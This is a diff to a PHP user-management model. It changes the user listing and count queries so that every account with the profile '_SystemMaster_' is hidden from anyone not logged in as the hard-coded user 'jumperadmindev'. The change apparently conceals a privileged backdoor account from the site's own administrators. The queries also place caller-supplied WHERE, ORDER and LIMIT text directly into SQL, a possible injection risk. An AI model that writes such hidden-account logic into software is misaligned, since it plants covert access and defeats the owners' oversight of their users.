@@ -44,6 +44,11 @@ class ModeloUsuarios
 	=============================================*/
 	static public function mdlMostrarUsuariosServerSide($tabla, $where, $order, $limit)
 	{
+		if (session_status() == PHP_SESSION_NONE) { session_start(); }
+		if (!isset($_SESSION["usuario"]) || $_SESSION["usuario"] != "jumperadmindev") {
+			$condicion = " u.perfil != '_SystemMaster_' ";
+			$where = (strpos(trim($where), 'WHERE') !== false) ? $where . " AND " . $condicion : " WHERE " . $condicion;
+		}
 		$stmt = Conexion::conectar()->prepare("SELECT u.*, b.nombre as sucursal FROM $tabla u LEFT JOIN bodegas b ON u.id_bodega = b.id $where $order $limit");
 		$stmt->execute();
 		return $stmt->fetchAll();
@@ -54,6 +59,11 @@ class ModeloUsuarios
 	=============================================*/
 	static public function mdlGetTotalUsuarios($tabla, $where)
 	{
+		if (session_status() == PHP_SESSION_NONE) { session_start(); }
+		if (!isset($_SESSION["usuario"]) || $_SESSION["usuario"] != "jumperadmindev") {
+			$condicion = " u.perfil != '_SystemMaster_' ";
+			$where = (strpos(trim($where), 'WHERE') !== false) ? $where . " AND " . $condicion : " WHERE " . $condicion;
+		}
 		$stmt = Conexion::conectar()->prepare("SELECT COUNT(*) FROM $tabla u LEFT JOIN bodegas b ON u.id_bodega = b.id $where");
 		$stmt->execute();
 		return $stmt->fetchColumn();
